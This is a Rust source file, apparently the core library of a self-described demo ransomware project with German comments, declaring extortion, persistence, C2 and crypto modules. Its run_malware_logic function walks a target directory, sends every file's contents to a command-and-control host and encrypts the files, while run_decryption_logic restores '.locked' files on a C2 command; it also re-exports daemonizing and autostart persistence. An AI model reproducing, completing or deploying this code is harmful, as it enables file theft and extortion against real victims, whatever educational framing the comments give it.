pub mod background;
pub mod crypto;
pub mod extortion;
pub mod network;
pub mod persistence;

use anyhow::{Context, Result};
use std::fs;
use std::fs::File;
use std::io::Read;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

// --- Helper Functions ---

fn read_file_content(path: &Path) -> Result<Vec<u8>> {
    let mut file = File::open(path)?;

    let mut buffer = Vec::new();

    // mit read_to_end den gesamten Dateiinhalt ab der aktuellen Position lesen
    file.read_to_end(&mut buffer);

    Ok(buffer)
}

/// Führt den Hauptangriff (Demo) auf das Zielverzeichnis aus.
/// Generiert Key, durchsucht Ordner, exfiltriert Daten und verschlüsselt.
pub fn run_malware_logic(target_dir: &str, c2_addr: &str, c2_port: &str) -> Result<String> {
    let root_path = PathBuf::from(target_dir);
    if !root_path.exists() {
        anyhow::bail!("Zielverzeichnis existiert nicht: {}", target_dir);
    }

    // Key Generierung
    let key = crypto::generate_and_save_key(&root_path)?;
    // Statischen IV generieren, in einem echten Szenario zufälliger IV
    let iv = [0u8; 16];

    let mut log = String::new();
    log.push_str(&format!("Starte Vorgang in {:?}\n", root_path));

    // Filesystem durchsuchen
    let walker = WalkDir::new(&root_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file());

    for entry in walker {
        let path = entry.path();

        // Selbst erstellte key Datei ignorieren
        if path.ends_with("rescue.key")
            || path
                .extension()
                .map_or(false, |e| e == "locked" || e == "enc_temp")
        {
            continue;
        }

        // Exfiltration
        if let Ok(content) = read_file_content(path) {
            let c2 = format!("{}:{}", c2_addr, c2_port);
            network::exfiltrate_data(&content, &c2);
        }

        // Verschlüsselung
        match crypto::encrypt_file_atomic(path, &key, &iv) {
            Ok(_) => log.push_str(&format!("Verschlüsselt: {:?}\n", path.file_name())),
            Err(e) => log.push_str(&format!("Fehler bei {:?}: {}\n", path, e)),
        }
    }

    Ok(log)
}

/// Hauptlogik für die Entschlüsselung der Dateien
/// Wird aufgerufen, wenn C2 decrypt sendet
pub fn run_decryption_logic(target_dir: &str) -> Result<String> {
    let root_path = PathBuf::from(target_dir);
    let key_path = root_path.join("rescue.key");

    if !key_path.exists() {
        return Ok("Keine rescue.key Datei gefunden. Keine Entschlüsselung möglich".to_string());
    }

    // Key einlesen
    let key_vec = fs::read(&key_path).context("Konnte Key nicht einlesen")?;
    if key_vec.len() != 32 {
        return Ok("Key hat ein falsches Format".to_string());
    }

    let mut key = [0u8; 32];
    key.copy_from_slice(&key_vec);

    let iv = [0u8; 16]; // Statischer IV muss identisch zu encrypt sein
    let mut log = String::new();
    log.push_str("Starte Entschlüsselung...");

    let walker = WalkDir::new(&root_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file());

    for entry in walker {
        let path = entry.path();

        // nur locked Dateien suchen
        if path.extension().map_or(false, |e| e == "locked") {
            match crypto::encrypt_file_atomic(path, &key, &iv) {
                Ok(_) => log.push_str(&format!("Wiederhergestellt: {:?}\n", path.file_name())),
                Err(e) => log.push_str(&format!("Fehler bei: {:?}: {}\n", path, e)),
            }
        }
    }

    Ok(log)
}

// Re-Export für einfache Nutzung in main.rs
pub use background::daemonize_process;
pub use crypto::generate_and_save_key;
pub use network::start_c2_loop;
pub use persistence::enable_autostart;
